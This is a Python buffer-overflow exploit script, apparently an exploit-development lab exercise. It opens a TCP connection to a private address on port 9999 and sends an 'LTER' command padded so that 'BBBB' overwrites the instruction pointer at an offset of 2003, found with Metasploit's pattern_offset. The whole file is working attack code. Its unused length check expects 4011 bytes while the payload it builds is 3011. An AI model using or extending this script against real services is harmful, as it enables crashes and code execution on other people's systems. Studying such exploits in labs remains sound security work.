#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from struct import pack
from sys import exit

rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)

def validate_payload_len(payload):
    expected_len = 4011
    payload_len = len(payload)
    if payload_len != expected_len:
        print('[!] Payload length was {l}, expected {e}'.format(l=payload_len, e=expected_len))
        exit(1)

# 11 bytes filler
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
# [*] Exact match at offset 2003
payload = "LTER /.:/" # 9 bytes
payload += "A" * 2003
payload += "BBBB"
payload += "D" * (3000 - len(payload) + 9)
payload += "\r\n" # 2 bytes

if __name__ == '__main__':
    print('[*] connecting to target')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(10)
    s.connect(target)
    print('[*] receving welcome message')
    msg = s.recv(1024)
    print('[*] received welcome message:\n\t{msg}'.format(msg=msg.rstrip()))
    print('[*] sending payload')
    s.send(payload)
    s.close()
    print('[*] B00M!')
